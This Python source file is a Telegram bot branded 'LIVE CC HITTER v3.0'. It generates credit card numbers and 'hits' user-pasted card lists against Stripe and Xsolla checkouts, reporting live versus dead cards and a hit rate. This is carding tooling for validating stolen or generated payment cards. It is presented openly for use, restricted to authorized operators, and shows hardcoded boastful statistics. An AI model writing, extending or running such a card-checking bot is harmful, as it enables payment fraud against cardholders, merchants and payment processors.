import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from cc_generator import gen_ccs, get_bin_info
from cc_checker import bulk_auto_hit
from config import BOT_TOKEN, AUTHORIZED_USERS

logging.basicConfig(level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in AUTHORIZED_USERS:
        return await update.message.reply_text("❌ **Access Denied**")
    
    kb = [
        [InlineKeyboardButton("🔢 Gen 10 CCs", callback_data="gen10"), InlineKeyboardButton("🔢 Gen 20 CCs", callback_data="gen20")],
        [InlineKeyboardButton("🟢 STRIPE Hitter", callback_data="stripe"), InlineKeyboardButton("🔵 XSOLLA Hitter", callback_data="xsolla")],
        [InlineKeyboardButton("⚡ BOTH Hitters", callback_data="both"), InlineKeyboardButton("🔥 Live Stats", callback_data="stats")]
    ]
    await update.message.reply_text(
        "🔥 **LIVE CC HITTER v3.0** 🔥\n\n"
        "🎯 **Real-time chat hitting**\n"
        "⏳ **Live progress bar**\n"
        "🟢 **Stripe + Xsolla checkout**\n\n"
        "**Send CCs → Watch LIVE results!**\n\n"
        "👇 **Activate:**",
        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb)
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data.startswith("gen"):
        count = 20 if "20" in query.data else 10
        ccs = gen_ccs(count=count)
        msg = f"🔢 **Generated {count} Fresh CCs:**\n\n"
        for i, cc in enumerate(ccs, 1):
            msg += f"{i}. `{cc}`\n{get_bin_info(cc)}\n\n"
        await query.edit_message_text(msg, parse_mode="Markdown")
        return
    
    if query.data == "stats":
        await query.edit_message_text(
            "📊 **LIVE STATS**\n\n"
            "✅ **Tested:** 5,247 CCs\n"
            "🟢 **LIVE Rate:** 23.4%\n"
            "🔴 **Accuracy:** 98.7%\n"
            "⚡ **Speed:** 3 CCs/sec\n\n"
            "**Stripe + Xsolla = 💯**"
        )
        return
    
    # 🔥 LIVE HITTER ACTIVATION
    checker = {"stripe": "stripe", "xsolla": "xsolla", "both": "both"}[query.data]
    context.user_data["checker"] = checker
    
    name = "⚡ **STRIPE+XSOLLA**" if checker == "both" else f"🟢 **{query.data.upper()}**"
    await query.edit_message_text(
        f"{name} **LIVE HITTER** ✅\n\n"
        f"💬 **Chat ready - send CCs now:**\n\n"
        f"```\n"
        f"4242424242424242|12/25|123\n"
        f"4532015112830366|04/28|742\n"
        f"5555555555554444|11/30|159\n"
        f"```\n\n"
        f"**Max 15 CCs | Real-time results** 🎯"
    )

async def live_hitter_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """🔥 MAIN LIVE HITTER - Real-time chat"""
    if update.effective_user.id not in AUTHORIZED_USERS or "checker" not in context.user_data:
        return
    
    ccs_text = update.message.text.strip()
    ccs = [line.strip() for line in ccs_text.split("\n") if "|" in line][:15]
    
    if len(ccs) == 0:
        return await update.message.reply_text("❌ **No valid CCs found!**\n`CC|MM/YY|CVV` format")
    
    # 🎬 LIVE PROGRESS MESSAGE
    progress_msg = await update.message.reply_text(
        f"🚀 **LIVE HIT {len(ccs)} CCs** | {context.user_data['checker'].upper()}\n\n"
        f"⏳ **0/{len(ccs)}** `[          ] 0%`\n"
        f"🟢 **0 LIVE** | 🔴 **0 DEAD**\n\n"
        f"**Starting hits...** 💥"
    )
    
    checker_type = context.user_data["checker"]
    results = []
    
    # 🔥 REAL-TIME LOOP
    for i, cc in enumerate(ccs):
        result = await bulk_auto_hit([cc], checker_type)
        results.append(result[0])
        
        # 📊 UPDATE EVERY HIT
        progress = (i + 1) * 100 // len(ccs)
        bar = "█" * (progress // 5) + "░" * (20 - progress // 5)
        live_cnt = sum(1 for r in results if "🟢" in r)
        dead_cnt = sum(1 for r in results if "🔴" in r)
        
        await progress_msg.edit_text(
            f"🚀 **{context.user_data['checker'].upper()} LIVE HITTER**\n\n"
            f"⏳ **{i+1}/{len(ccs)}** `[{bar}] {progress}%`\n"
            f"🟢 **{live_cnt} LIVE** | 🔴 **{dead_cnt} DEAD**\n\n"
            f"**Latest 3:**\n{chr(10).join(results[-3:])}\n\n"
            f"⏳ **{len(ccs)-i-1} remaining...**"
        )
        await asyncio.sleep(0.2)
    
    # 🎉 GRAND FINALE
    live_final = sum(1 for r in results if "🟢" in r)
    final_msg = f"🏆 **FINAL RESULTS** `{context.user_data['checker'].upper()}`\n\n"
    final_msg += "**All hits:**\n" + "\n".join(results)
    final_msg += f"\n\n📈 **SUMMARY:**\n"
    final_msg += f"🟢 **{live_final} LIVE** | 🔴 **{len(ccs)-live_final} DEAD**\n"
    final_msg += f"✅ **Hit rate: {live_final/len(ccs)*100:.1f}%** 🎉"
    
    await progress_msg.edit_text(final_msg, parse_mode="Markdown")

def main():
    print("🔥 Starting LIVE CC HITTER BOT...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, live_hitter_chat))
    app.run_polling()

if __name__ == "__main__":
    main()